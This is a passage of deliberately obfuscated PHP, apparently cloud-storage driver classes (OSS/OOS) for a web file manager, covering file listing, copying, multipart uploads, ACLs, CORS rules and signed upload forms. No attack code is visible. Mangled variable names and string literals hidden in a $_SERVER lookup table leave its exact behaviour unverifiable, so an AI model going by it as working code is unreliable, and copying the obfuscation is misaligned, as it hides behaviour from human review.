intval($Ø…ôÓÄ / $©¤); $®ÄÖ¤ÁÎÄş•£ = fopen($ÏÌ“•ªªê–, $ëğµ[1303]); if (!$®ÄÖ¤ÁÎÄş•£) { return $ªÌÜ£¿Ó®ïŞ–; } for ($Àãµ§’ = 0; $Àãµ§’ < $©¤; $Àãµ§’++) { fseek_64($®ÄÖ¤ÁÎÄş•£, $ª¨ßĞÔ * $Àãµ§’); $ªÌÜ£¿Ó®ïŞ– .= fread($®ÄÖ¤ÁÎÄş•£, $æ³); } fseek_64($®ÄÖ¤ÁÎÄş•£, $Ø…ôÓÄ - $æ³); $ªÌÜ£¿Ó®ïŞ– .= fread($®ÄÖ¤ÁÎÄş•£, $æ³); fclose($®ÄÖ¤ÁÎÄş•£); return md5($ªÌÜ£¿Ó®ïŞ–) . $Ø…ôÓÄ; } public function getContent($èÏøÈ’†) { $èÏøÈ’† = $this->iconvSystem($èÏøÈ’†); return file_get_contents($èÏøÈ’†); } public function setContent($¦‰°›£”, $çÁ™ÈàÊã³² = '') { $¦‰°›£” = $this->iconvSystem($¦‰°›£”); $¥ˆ÷³¶ñ‡°¾« = @file_put_contents($¦‰°›£”, $çÁ™ÈàÊã³², LOCK_EX); clearstatcache(); @chmod($¦‰°›£”, $this->pathAuth); return $¥ˆ÷³¶ñ‡°¾« === !1 ? !1 : !0; } public function fileSubstr($É´°¾é, $¿´ãêí = 0, $ÁÉˆÆâĞ³€ = false) { $÷ˆ =& $_SERVER[ÀÆ]; $É´°¾é = $this->iconvSystem($É´°¾é); if ($ÁÉˆÆâĞ³€ === !1) { $ÁÉˆÆâĞ³€ = $this->size($É´°¾é); } if ($ÁÉˆÆâĞ³€ <= 0) { return $÷ˆ[33]; } $ƒ¤Î· = fopen($É´°¾é, $÷ˆ[1303]); if (!$ƒ¤Î·) { return !1; } fseek_64($ƒ¤Î·, $¿´ãêí); $óÍ¢¿ë‹™Ï— = fread($ƒ¤Î·, $ÁÉˆÆâĞ³€); fclose($ƒ¤Î·); return $óÍ¢¿ë‹™Ï—; } public function upload($«½ºåÕ½¢»¡š, $¨Üí¦ø, $šê—Â¹ø = false, $Äéèß°’ö ² = REPEAT_REPLACE) { if ($šê—Â¹ø) { return $this->moveFile($¨Üí¦ø, $«½ºåÕ½¢»¡š); } return $this->copyFile($¨Üí¦ø, $«½ºåÕ½¢»¡š); } public function setModifyTime($å’§Œ“„, $†ø» = '') { @touch($å’§Œ“„, intval($†ø»)); } public function download($¶¨†„éÅ¨, $ŠÌĞÕÛªĞÖ) { return $this->iconvSystem($¶¨†„éÅ¨); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($´Äğ‡Ÿ) { parent::__construct($´Äğ‡Ÿ); $this->signatureVersion($_SERVER[ÀÆ][212]); } public function fileOutLink($ªğ) { $ÉÛ‚õÍ½ =& $_SERVER[ÀÆ]; if (substr($ªğ, 0, 7) == $ÉÛ‚õÍ½[1248]) { $ªğ = $ÉÛ‚õÍ½[1249] . substr($ªğ, 7); } header($ÉÛ‚õÍ½[159] . $ªğ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($ÂÒ˜íÉ­™×) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÀÆ][1304]; $this->_init($ÂÒ˜íÉ­™×); } public function _init($·–¢Ìé†•) { $¿ˆ’»® =& $_SERVER[ÀÆ]; foreach ($·–¢Ìé†• as $¤ì => $†üæˆ) { if (isset($this->{$¤ì})) { $this->{$¤ì} = $†üæˆ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¿ˆ’»®[1305] . LNG($¿ˆ’»®[1306])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ğ¬¬ĞÌâ‰ =& $_SERVER[ÀÆ]; $¹õêë— = new OSS\Model\CorsConfig(); $ıõ’ŞÆ = new OSS\Model\CorsRule(); $ıõ’ŞÆ->addAllowedOrigin($ğ¬¬ĞÌâ‰[1307]); $ıõ’ŞÆ->addAllowedMethod($ğ¬¬ĞÌâ‰[1308]); $ıõ’ŞÆ->addAllowedMethod($ğ¬¬ĞÌâ‰[1309]); $ıõ’ŞÆ->addAllowedMethod($ğ¬¬ĞÌâ‰[1310]); $ıõ’ŞÆ->addAllowedMethod($ğ¬¬ĞÌâ‰[1311]); $ıõ’ŞÆ->addAllowedMethod($ğ¬¬ĞÌâ‰[158]); $ıõ’ŞÆ->setMaxAgeSeconds(600); $ıõ’ŞÆ->addExposeHeader($ğ¬¬ĞÌâ‰[1312]); $ıõ’ŞÆ->addAllowedHeader($ğ¬¬ĞÌâ‰[1307]); $¹õêë—->addRule($ıõ’ŞÆ); try { $this->client->putBucketCors($this->bucket, $¹õêë—); } catch (OSS\Core\OssException $â”Ó´–¹ÁÀ) { return !1; } return !0; } public function getBucketCors() { $ç’¼ =& $_SERVER[ÀÆ]; $Ñä±ƒİñÄŸ = null; try { $Ñä±ƒİñÄŸ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $÷ìÍóÒ) { return null; } if (!$Ñä±ƒİñÄŸ || !($Á¨×·™¥î = $Ñä±ƒİñÄŸ->getRules())) { return null; } $ş­Ù = $Á¨×·™¥î[0]->getAllowedOrigins(); $ßÚšİ¯¿¦ = $Á¨×·™¥î[0]->getAllowedMethods(); $à¼ÇÓù®õ© = $Á¨×·™¥î[0]->getMaxAgeSeconds(); $—õïšØ­ŒÅ = $Á¨×·™¥î[0]->getExposeHeaders(); $éé§ı‰Ší = $Á¨×·™¥î[0]->getAllowedHeaders(); return array($ç’¼[181] => isset($ş­Ù[0]) ? $ş­Ù[0] : $ç’¼[33], $ç’¼[185] => $ßÚšİ¯¿¦, $ç’¼[1313] => $à¼ÇÓù®õ©, $ç’¼[1314] => isset($—õïšØ­ŒÅ[0]) ? $—õïšØ­ŒÅ[0] : $ç’¼[33], $ç’¼[183] => isset($éé§ı‰Ší[0]) ? $éé§ı‰Ší[0] : $ç’¼[33]); } public function isBucketCors() { $–µù‡‡´ =& $_SERVER[ÀÆ]; $Ò«íÃã™ü¥¿Ô = $this->getBucketCors(); if (!$Ò«íÃã™ü¥¿Ô || !is_array($Ò«íÃã™ü¥¿Ô)) { return !1; } if ($Ò«íÃã™ü¥¿Ô[$–µù‡‡´[181]] != $–µù‡‡´[182] || $Ò«íÃã™ü¥¿Ô[$–µù‡‡´[183]] != $–µù‡‡´[182]) { return !1; } $¼«¾£ğ¾¥Ñ² = array_map($–µù‡‡´[184], $Ò«íÃã™ü¥¿Ô[$–µù‡‡´[185]]); if (!is_array($¼«¾£ğ¾¥Ñ²)) { $¼«¾£ğ¾¥Ñ² = array(); } $â´¢¢‡—¹¬Õ = array($–µù‡‡´[186], $–µù‡‡´[187], $–µù‡‡´[188], $–µù‡‡´[189], $–µù‡‡´[190]); $¦µÆûì = array_diff($â´¢¢‡—¹¬Õ, $¼«¾£ğ¾¥Ñ²); return empty($¦µÆûì); } public function mkfile($‘¿ÏÓ, $®ò = '', $í±ØÊ² = REPEAT_RENAME) { $ûØæÎÜ‹ï‚ø‘ = $this->setContent($‘¿ÏÓ, $®ò); if ($ûØæÎÜ‹ï‚ø‘ !== !1) { return $this->getPathOuter($‘¿ÏÓ); } return !1; } public function mkdir($™Î¢×ËŞ, $¶‰ß©ì = REPEAT_SKIP) { if ($this->_isFolder($™Î¢×ËŞ)) { return $this->getPathOuter($™Î¢×ËŞ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($™Î¢×ËŞ)); } catch (OSS\Core\OssException $èà×) { return !1; } return $this->getPathOuter($™Î¢×ËŞ); } private function fileList($¬¾›ûÚ‹, $ûìùêõ = '', $éÔ¤òİ = 0) { $Ûüõ’ŒŞ˜ùç¤ =& $_SERVER[ÀÆ]; $¬¾›ûÚ‹ = trim($¬¾›ûÚ‹, $Ûüõ’ŒŞ˜ùç¤[8]); $ÒÚ¢ûĞ¡ = empty($¬¾›ûÚ‹) && $¬¾›ûÚ‹ !== $Ûüõ’ŒŞ˜ùç¤[191] ? $Ûüõ’ŒŞ˜ùç¤[33] : $¬¾›ûÚ‹ . $Ûüõ’ŒŞ˜ùç¤[8]; $¹†¯İ„ = $Ûüõ’ŒŞ˜ùç¤[33]; $©Ó¨ = 1000; $‡¡Ç¡Öğ´à = $this->listItemCache === !1 ? !1 : !0; $àİñ = $Ÿó•’ = array(); while (!0) { check_abort(); $îÇ = array($Ûüõ’ŒŞ˜ùç¤[1315] => $ûìùêõ, $Ûüõ’ŒŞ˜ùç¤[1316] => $ÒÚ¢ûĞ¡, $Ûüõ’ŒŞ˜ùç¤[1317] => $©Ó¨, $Ûüõ’ŒŞ˜ùç¤[1318] => $¹†¯İ„); try { $¯ûŸÒŒˆ­“ß = $this->client->listObjects($this->bucket, $îÇ); } catch (OSS\Core\OssException $’™‡î€•ŸÂ´) { break; } $¹†¯İ„ = $¯ûŸÒŒˆ­“ß->getNextMarker(); $õšª¿Ş‚ = $¯ûŸÒŒˆ­“ß->getObjectList(); $ÑÀ«‹ = $¯ûŸÒŒˆ­“ß->getPrefixList(); foreach ($õšª¿Ş‚ as $å¯ÎŸëôüÕò) { if ($å¯ÎŸëôüÕò->getKey() == $ÒÚ¢ûĞ¡) { continue; } $ˆÎ„îñêÁ’€Ğ = $å¯ÎŸëôüÕò->getKey(); $€ÔÁº = $å¯ÎŸëôüÕò->getSize(); $€ŸÄì°€ = $å¯ÎŸëôüÕò->getLastModified(); $ïú•¦Óßİ‚ä = $éÔ¤òİ ? array($Ûüõ’ŒŞ˜ùç¤[28] => $ˆÎ„îñêÁ’€Ğ, $Ûüõ’ŒŞ˜ùç¤[78] => $€ÔÁº, $Ûüõ’ŒŞ˜ùç¤[197] => strtotime($€ŸÄì°€)) : $ˆÎ„îñêÁ’€Ğ; $£Ö = $€ÔÁº == 0 && substr($ˆÎ„îñêÁ’€Ğ, strlen($ˆÎ„îñêÁ’€Ğ) - 1, 1) == $Ûüõ’ŒŞ˜ùç¤[8] ? !0 : !1; if ($‡¡Ç¡Öğ´à) { $this->cacheMethod($Ûüõ’ŒŞ˜ùç¤[199], $ˆÎ„îñêÁ’€Ğ, $£Ö); $this->cacheMethod($Ûüõ’ŒŞ˜ùç¤[200], $ˆÎ„îñêÁ’€Ğ, array($Ûüõ’ŒŞ˜ùç¤[78] => $€ÔÁº, $Ûüõ’ŒŞ˜ùç¤[1319] => $€ÔÁº, $Ûüõ’ŒŞ˜ùç¤[84] => strtotime($€ŸÄì°€), $Ûüõ’ŒŞ˜ùç¤[1320] => $€ŸÄì°€)); } if ($£Ö) { $àİñ[] = $ˆÎ„îñêÁ’€Ğ; continue; } $Ÿó•’[] = $ïú•¦Óßİ‚ä; } foreach ($ÑÀ«‹ as $…µˆÉ) { $àİñ[] = $…µˆÉ->getPrefix(); if ($‡¡Ç¡Öğ´à) { $this->cacheMethod($Ûüõ’ŒŞ˜ùç¤[199], $ˆÎ„îñêÁ’€Ğ, !0); } } if ($¹†¯İ„ === $Ûüõ’ŒŞ˜ùç¤[33]) { break; } } if ($‡¡Ç¡Öğ´à) { $this->cacheMethod($Ûüõ’ŒŞ˜ùç¤[199], $¬¾›ûÚ‹, !0); } return array($Ûüõ’ŒŞ˜ùç¤[75] => $àİñ, $Ûüõ’ŒŞ˜ùç¤[74] => $Ÿó•’); } public function copyFile($ìüìÀş, $¢·»®¡Ôµ‚€Ø) { $œ‚€ = $this->size($ìüìÀş); if ($œ‚€ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ìüìÀş, $this->bucket, $this->pathEncode($¢·»®¡Ôµ‚€Ø)); } catch (OSS\Core\OssException $¶õŸï) { return !1; } return $this->getPathOuter($¢·»®¡Ôµ‚€Ø); } $‹ˆøÓÊ‡¿‡Ã— = $this->multiCopyObject($ìüìÀş, $¢·»®¡Ôµ‚€Ø, $œ‚€); return $‹ˆøÓÊ‡¿‡Ã— ? $this->getPathOuter($¢·»®¡Ôµ‚€Ø) : !1; } private function multiCopyObject($Õ³Ï›, $ç, $û”ÈåÏÙÚ‚) { $Áä =& $_SERVER[ÀÆ]; try { $´éÕ = array(); if ($£Ëßƒ¶’º¥ = $this->hashMd5($Õ³Ï›)) { $´éÕ = array(OSS\OssClient::OSS_HEADERS => array($Áä[1321] => $£Ëßƒ¶’º¥)); } $®ÇìÌ¦ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ç), $´éÕ); $›şÎ«øúÁä®½ = 1; $¼ŠååæÒ = 0; $ßÖ = array(); $¹¸ş = 1024 * 1024 * 10; $Êë³Ğ‚Ã»é = $this->client->generateMultiuploadParts($û”ÈåÏÙÚ‚, $¹¸ş); foreach ($Êë³Ğ‚Ã»é as $ğÔé£ ã÷ => $Ğ…Ìîà‚„´) { $çã’­Ï = $¼ŠååæÒ + (int) $Ğ…Ìîà‚„´[$Áä[1322]]; $ô› = (int) $Ğ…Ìîà‚„´[$Áä[335]] + $çã’­Ï - 1; $ˆ­¢›¯ä€± = array($Áä[1323] => $çã’­Ï, $Áä[1324] => $ô›); $ßÖ[] = $this->client->uploadPartCopy($this->bucket, $Õ³Ï›, $this->bucket, $this->pathEncode($ç), $›şÎ«øúÁä®½, $®ÇìÌ¦, $ˆ­¢›¯ä€±); $›şÎ«øúÁä®½ = $›şÎ«øúÁä®½ + 1; } $¤­Ê¢ = array(); foreach ($ßÖ as $ğÔé£ ã÷ => $Àöòö“Å) { $¤­Ê¢[] = array($Áä[1325] => $ğÔé£ ã÷ + 1, $Áä[1326] => $Àöòö“Å); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ç), $®ÇìÌ¦, $¤­Ê¢); } catch (OSS\Core\OssException $øœÁìõ¼íÏ) { return !1; } return !0; } public function moveFile($•Ç, $¥Œä¤ûï) { if ($this->copyFile($•Ç, $¥Œä¤ûï)) { $this->remove($•Ç); return $this->getPathOuter($¥Œä¤ûï); } return !1; } public function delFile($í¼) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($í¼)); } catch (OSS\Core\OssException $™ôìÑÄöë) { return !1; } return !0; } public function delFolder($İşä‡Û†«±È) { $²Š¾Á¨– =& $_SERVER[ÀÆ]; if (!$this->exist($İşä‡Û†«±È)) { return !0; } $this->listItemCache = !1; $—É¬îœå²ƒ = $this->fileList($İşä‡Û†«±È); $this->listItemCache = !0; $ò¾äÏ¸”Éæ» = trim($İşä‡Û†«±È, $²Š¾Á¨–[8]) . $²Š¾Á¨–[8]; if (!empty($İşä‡Û†«±È) && $İşä‡Û†«±È !== $²Š¾Á¨–[191] && !in_array($ò¾äÏ¸”Éæ», $—É¬îœå²ƒ[$²Š¾Á¨–[75]])) { $—É¬îœå²ƒ[$²Š¾Á¨–[75]][] = $ò¾äÏ¸”Éæ»; } $¸›Êøş = $this->delByBatch($—É¬îœå²ƒ[$²Š¾Á¨–[74]]); if (!$¸›Êøş) { return !1; } $¸›Êøş = $this->delByBatch($—É¬îœå²ƒ[$²Š¾Á¨–[75]]); if (!$¸›Êøş) { return !1; } return $this->delFile($ò¾äÏ¸”Éæ»); } private function delByBatch($¾„©Ÿ ) { foreach (array_chunk($¾„©Ÿ , 1000) as $ûçš‰¤) { try { $this->client->deleteObjects($this->bucket, $ûçš‰¤); } catch (OSS\Core\OssException $‰Ö¤ñˆÁ†Èã) { return !1; } } return !0; } public function rename($¢¾ª×ı›Ë¢, $ËÚç÷†É™) { return $this->renameObject($¢¾ª×ı›Ë¢, $ËÚç÷†É™); } private function fileInfo($Œ‹æ¸¢²Å, $´Ñ©ÔôñË¤¹ = false, $ùŸÎ = array()) { $å²ÀªØİ¹ =& $_SERVER[ÀÆ]; $«êö» = array($å²ÀªØİ¹[28] => $this->pathThis($Œ‹æ¸¢²Å), $å²ÀªØİ¹[76] => $this->getPathOuter($Œ‹æ¸¢²Å), $å²ÀªØİ¹[29] => $å²ÀªØİ¹[193], $å²ÀªØİ¹[78] => isset($ùŸÎ[$å²ÀªØİ¹[78]]) ? $ùŸÎ[$å²ÀªØİ¹[78]] : 0, $å²ÀªØİ¹[168] => $this->ext($Œ‹æ¸¢²Å)); if ($´Ñ©ÔôñË¤¹) { return $«êö»; } $«êö»[$å²ÀªØİ¹[194]] = $«êö»[$å²ÀªØİ¹[84]] = 0; $«êö»[$å²ÀªØİ¹[195]] = $«êö»[$å²ÀªØİ¹[196]] = !0; if (empty($ùŸÎ)) { $ £ = $this->objectMeta($Œ‹æ¸¢²Å); if (!$ £) { return $«êö»; } $ùŸÎ = array($å²ÀªØİ¹[84] => strtotime($ £[$å²ÀªØİ¹[1320]]), $å²ÀªØİ¹[78] => $ £[$å²ÀªØİ¹[1319]] + 0); } if (isset($ùŸÎ[$å²ÀªØİ¹[78]])) { $«êö»[$å²ÀªØİ¹[78]] = $ùŸÎ[$å²ÀªØİ¹[78]]; } if (isset($ùŸÎ[$å²ÀªØİ¹[84]])) { $«êö»[$å²ÀªØİ¹[84]] = $ùŸÎ[$å²ÀªØİ¹[84]]; } if (isset($ùŸÎ[$å²ÀªØİ¹[197]]) && !trim($«êö»[$å²ÀªØİ¹[84]])) { $«êö»[$å²ÀªØİ¹[84]] = $ùŸÎ[$å²ÀªØİ¹[197]]; } return $«êö»; } private function folderInfo($³—‡”Ãó, $–†²“ª°ªò‡ = false, $‚‡¨Œ… = array()) { $ûÚ =& $_SERVER[ÀÆ]; $ÑÉÔûÌó = array($ûÚ[28] => $this->pathThis($³—‡”Ãó), $ûÚ[76] => $this->getPathOuter($ûÚ[8] . $³—‡”Ãó), $ûÚ[29] => $ûÚ[77]); if ($–†²“ª°ªò‡) { return $ÑÉÔûÌó; } $ÑÉÔûÌó[$ûÚ[194]] = $ÑÉÔûÌó[$ûÚ[84]] = 0; $ÑÉÔûÌó[$ûÚ[195]] = $ÑÉÔûÌó[$ûÚ[196]] = !0; if (empty($‚‡¨Œ…)) { $³—‡”Ãó = rtrim($³—‡”Ãó, $ûÚ[8]) . $ûÚ[8]; $Ó» = $this->objectMeta($³—‡”Ãó); if (!$Ó») { return $ÑÉÔûÌó; } $‚‡¨Œ… = array($ûÚ[194] => $Ó»[$ûÚ[505]][$ûÚ[1327]], $ûÚ[84] => strtotime($Ó»[$ûÚ[1320]])); } if (isset($‚‡¨Œ…[$ûÚ[84]])) { $ÑÉÔûÌó[$ûÚ[84]] = $‚‡¨Œ…[$ûÚ[84]]; } if (isset($‚‡¨Œ…[$ûÚ[194]])) { $ÑÉÔûÌó[$ûÚ[194]] = $‚‡¨Œ…[$ûÚ[194]]; } return $ÑÉÔûÌó; } public function listPath($­Ã¬ò¦ÅÉÖ, $—Ï = false) { $¯®‘Ò­êÄ =& $_SERVER[ÀÆ]; $ëéŞéõÚö“ = $this->fileList($­Ã¬ò¦ÅÉÖ, $¯®‘Ò­êÄ[8], !0); foreach ($ëéŞéõÚö“[$¯®‘Ò­êÄ[75]] as $æÛÜãŸÍ => $®‡ê‰š³ßŞ¢) { $ëéŞéõÚö“[$¯®‘Ò­êÄ[75]][$æÛÜãŸÍ] = $this->folderInfo($®‡ê‰š³ßŞ¢, $—Ï, $®‡ê‰š³ßŞ¢); } foreach ($ëéŞéõÚö“[$¯®‘Ò­êÄ[74]] as $æÛÜãŸÍ => $®‡ê‰š³ßŞ¢) { $ëéŞéõÚö“[$¯®‘Ò­êÄ[74]][$æÛÜãŸÍ] = $this->fileInfo($®‡ê‰š³ßŞ¢[$¯®‘Ò­êÄ[28]], $—Ï, $®‡ê‰š³ßŞ¢); } return $ëéŞéõÚö“; } public function has($·ˆÒİúÓ, $­€É = false, $€¢ªøÅ¬ßáï = true) { $ıç‡ÏéµÌ =& $_SERVER[ÀÆ]; $·ˆÒİúÓ = trim($·ˆÒİúÓ, $ıç‡ÏéµÌ[8]); $®×Ö€ü = empty($·ˆÒİúÓ) && $·ˆÒİúÓ !== $ıç‡ÏéµÌ[191] ? $ıç‡ÏéµÌ[33] : $·ˆÒİúÓ . $ıç‡ÏéµÌ[8]; $ÀÔåıŞş‡Üº = $ıç‡ÏéµÌ[33]; $ˆ‚İ©ÑûŠ´ = 500; $ıî¸‚ = $–‰ŸÎª§ = 0; while (!0) { check_abort(); $ûí = array($ıç‡ÏéµÌ[1315] => $ıç‡ÏéµÌ[8], $ıç‡ÏéµÌ[1316] => $®×Ö€ü, $ıç‡ÏéµÌ[1317] => $ˆ‚İ©ÑûŠ´, $ıç‡ÏéµÌ[1318] => $ÀÔåıŞş‡Üº); try { $ÀÙÛ¶è = $this->client->listObjects($this->bucket, $ûí); } catch (OSS\Core\OssException $µŠ´¾ƒ) { break; } $ÀÔåıŞş‡Üº = $ÀÙÛ¶è->getNextMarker(); $½ÀÇ = $ÀÙÛ¶è->getObjectList(); $–Ö = $ÀÙÛ¶è->getPrefixList(); if ($­€É) { if (count($½ÀÇ) > 1 || count($½ÀÇ) == 1 && $½ÀÇ[0]->getKey() != $®×Ö€ü) { $ıî¸‚ += count($½ÀÇ) - 1; } if (!empty($–Ö)) { $–‰ŸÎª§ += count($–Ö); } if ($ÀÔåıŞş‡Üº === $ıç‡ÏéµÌ[33]) { break; } continue; } if ($€¢ªøÅ¬ßáï) { if (!empty($½ÀÇ)) { if (count($½ÀÇ) > 1 || $½ÀÇ[0]->getKey() != $®×Ö€ü) { return !0; } } } else { if (!empty($–Ö)) { return !0; } } if ($ÀÔåıŞş‡Üº === $ıç‡ÏéµÌ[33]) { break; } } if ($­€É) { return array($ıç‡ÏéµÌ[203] => $ıî¸‚, $ıç‡ÏéµÌ[204] => $–‰ŸÎª§); } return !1; } public function listAll($º„) { $‹ ·ŒêÙïÜİ =& $_SERVER[ÀÆ]; $èÅ¼…Ğ = $this->fileList($º„, $‹ ·ŒêÙïÜİ[33], !0); $çôšÁí”ÄÂø = array(); foreach ($èÅ¼…Ğ[$‹ ·ŒêÙïÜİ[74]] as $·ˆçßÔ¬) { $çôšÁí”ÄÂø[$·ˆçßÔ¬[$‹ ·ŒêÙïÜİ[28]]] = $·ˆçßÔ¬[$‹ ·ŒêÙïÜİ[78]]; } foreach ($èÅ¼…Ğ[$‹ ·ŒêÙïÜİ[75]] as $·ˆçßÔ¬) { if (is_string($·ˆçßÔ¬)) { $çôšÁí”ÄÂø[$·ˆçßÔ¬] = 0; } } return $this->listAllFiles($º„, array_keys($çôšÁí”ÄÂø), $çôšÁí”ÄÂø); } public function canRead($”©Ÿ) { $‰Ãéå =& $_SERVER[ÀÆ]; $¡ŸïšØ = $this->pathAcl($”©Ÿ); return $¡ŸïšØ == $‰Ãéå[1328] || $¡ŸïšØ == $‰Ãéå[544] ? !0 : !1; } public function canWrite($ˆóğ·‚) { $ı‡¿øÌõÒ­® = $this->pathAcl($ˆóğ·‚); return $ı‡¿øÌõÒ­® == $_SERVER[ÀÆ][544] ? !0 : !1; } public function pathAcl($´Ë‰¸øÅ) { $…Şáü¼ =& $_SERVER[ÀÆ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ ßæŸÏÚçÑÊ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($´Ë‰¸øÅ)); } catch (OSS\Core\OssException $ê ‹Ú¤†Çü†) { return !1; } $€×úõé­ÁĞ = $ ßæŸÏÚçÑÊ == $…Şáü¼[34] ? $this->bucketAcl : $ ßæŸÏÚçÑÊ; if ($€×úõé­ÁĞ == $…Şáü¼[1329]) { return $…Şáü¼[1328]; } if ($€×úõé­ÁĞ == $…Şáü¼[1330]) { return $…Şáü¼[544]; } return $€×úõé­ÁĞ; } private function chmodPath($©”¸ÃŒ×, $±Ú©–­¢ = '') { $›õıºı†’ =& $_SERVER[ÀÆ]; $—ŒåÁÒ« = empty($±Ú©–­¢) ? $›õıºı†’[1330] : $±Ú©–­¢; $ôî = array($›õıºı†’[34], $›õıºı†’[192], $›õıºı†’[1329], $›õıºı†’[1330]); if (!in_array($—ŒåÁÒ«, $ôî)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($©”¸ÃŒ×), $—ŒåÁÒ«); } catch (OSS\Core\OssException $æû§‹Ş®È¢À) { return !1; } return !0; } public function getContent($¢Ù­¨µ) { return $this->fileSubstr($¢Ù­¨µ, -1); } public function setContent($¬©Æ, $õ¾ÉÎ„š”Ğ = '') { $¬â²Ş =& $_SERVER[ÀÆ]; try { $²øúŞ…ÈÂ = $this->trafficLimit($¬â²Ş[1331]); $ìÑŸ§ó = $this->client->putObject($this->bucket, $this->pathEncode($¬©Æ), $õ¾ÉÎ„š”Ğ, $²øúŞ…ÈÂ); } catch (OSS\Core\OssException $ƒ€†Ó) { return !1; } $·ğ°³Õ‹” = array($¬â²Ş[1321] => trim($ìÑŸ§ó[$¬â²Ş[1332]], $¬â²Ş[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¬©Æ))); $this->updateObjMeta($¬©Æ, $·ğ°³Õ‹”); return isset($ìÑŸ§ó[$¬â²Ş[1333]][$¬â²Ş[1280]]) ? !0 : !1; } private function updateObjMeta($‘ûŞú, $Üë²«‡¦ÀÎÆ–) { $‘ûŞú = $this->pathEncode($‘ûŞú); try { $Õä¶ÜòÑ = array(OSS\OssClient::OSS_HEADERS => $Üë²«‡¦ÀÎÆ–); $this->client->copyObject($this->bucket, $‘ûŞú, $this->bucket, $‘ûŞú, $Õä¶ÜòÑ); } catch (OSS\Core\OssException $âŞ) { return !1; } return !0; } public function upload($úÈ Ñ‰, $˜Å•’·œìŒ–, $Œå–„êÏáØ = false, $Ğöœúæ¿× = REPEAT_REPLACE) { $û¸‡ùª³¯ =& $_SERVER[ÀÆ]; $œ‰‰•š„ = trim($úÈ Ñ‰, $û¸‡ùª³¯[8]); $½‹«ç·ÁÌ ø– = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($û¸‡ùª³¯[1321] => @md5_file($˜Å•’·œìŒ–)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($úÈ Ñ‰))); $½‹«ç·ÁÌ ø– = $this->trafficLimit($û¸‡ùª³¯[1331], $½‹«ç·ÁÌ ø–); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($œ‰‰•š„), $˜Å•’·œìŒ–, $½‹«ç·ÁÌ ø–); } catch (OSS\Core\OssException $ÁÇ) { return !1; } return $this->getPathOuter($úÈ Ñ‰); } public function getHost() { $›ŠË =& $_SERVER[ÀÆ]; $ÖÅõñ = explode($›ŠË[177], parent::getHost()); return $ÖÅõñ[0] . $›ŠË[177] . $this->bucket . $›ŠË[95] . $ÖÅõñ[1]; } public function uploadFormData($¶Æ, $¿ÖÇËä·ÖÕ¼ = 3600) { $õ™ Ó =& $_SERVER[ÀÆ]; if (!($îÍ“àÉÁú = $this->getHost())) { return !1; } $É˜°ÔŞ‚Á˜ = $¿ÖÇËä·ÖÕ¼; $ñ±Íí­Ûü³ = date($õ™ Ó[1334], time() + $É˜°ÔŞ‚Á˜); $ÒÊş = new DateTime($ñ±Íí­Ûü³); $ÊâÉØ‘Âƒù = $ÒÊş->format(DateTime::ISO8601); $ªÀ’È = strpos($ÊâÉØ‘Âƒù, $õ™ Ó[294]); $ÊâÉØ‘Âƒù = substr($ÊâÉØ‘Âƒù, 0, $ªÀ’È) . $õ™ Ó[1335]; $›Õ–Œ‚ÓÆÙ = 1048576000 * 5; $ÊÑÆÌõ = $this->pathFather($¶Æ); $™¤ªŸşÅã’“¯ = array($õ™ Ó[1235] => $ÊâÉØ‘Âƒù, $õ™ Ó[1236] => array(array($õ™ Ó[1336], 0, $›Õ–Œ‚ÓÆÙ), array($õ™ Ó[1239], $õ™ Ó[1240], $ÊÑÆÌõ))); $†Ó‡ = base64_encode(json_encode($™¤ªŸşÅã’“¯)); $¯’Ã½´” = base64_encode(hash_hmac($õ™ Ó[230], $†Ó‡, $this->secret, !0)); $£¡Ëñ¤ƒí• = array($õ™ Ó[1245] => $†Ó‡, $õ™ Ó[1337] => $this->accessKey, $õ™ Ó[1241] => $õ™ Ó[1233], $õ™ Ó[1338] => $¯’Ã½´”, $õ™ Ó[175] => $îÍ“àÉÁú); $£¡Ëñ¤ƒí• = $this->trafficLimit($õ™ Ó[1331], $£¡Ëñ¤ƒí•); return $£¡Ëñ¤ƒí•; } public function multiUploadFormData($İ‚‘Ë†, $¢¹Õ = 3600) { $«×ÈîÁù§ø =& $_SERVER[ÀÆ]; if (!($Î•Œ = $this->getHost())) { return !1; } $ÎÊ³¿ù = $this->trafficLimit($«×ÈîÁù§ø[1331]); $Ò·Å°ûÛÌ• = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($İ‚‘Ë†), $ÎÊ³¿ù); return array($«×ÈîÁù§ø[221] => $Ò·Å°ûÛÌ•, $«×ÈîÁù§ø[175] => $Î•Œ . $«×ÈîÁù§ø[8] . $this->pathEncode($İ‚‘Ë†), $«×ÈîÁù§ø[222] => gmdate($«×ÈîÁù§ø[1339]), $«×ÈîÁù§ø[93] => $İ‚‘Ë†); } public function multiUploadAuthData($™µåªéÅã, $·ÚÍÜ = array()) { $œªÛ =& $_SERVER[ÀÆ]; $ìŞëŠûõë´¨ = isset($·ÚÍÜ[$œªÛ[222]]) ? $·ÚÍÜ[$œªÛ[222]] : gmdate($œªÛ[1339]); $ÔöÏ®¡¸ = isset($·ÚÍÜ[$œªÛ[168]]) ? $·ÚÍÜ[$œªÛ[168]] : 